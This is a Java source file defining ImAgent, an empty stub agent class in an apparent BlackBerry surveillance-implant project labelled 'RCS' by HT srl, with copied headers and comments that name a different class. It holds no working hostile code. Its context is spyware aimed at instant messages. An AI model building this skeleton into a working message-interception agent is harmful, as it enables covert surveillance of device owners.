//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * PIM, calendario, appuntamenti.
 */
public final class ImAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ImAgent(final boolean agentStatus) {
        super(Agent.AGENT_IM, agentStatus, true, "ImAgent");

    }

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
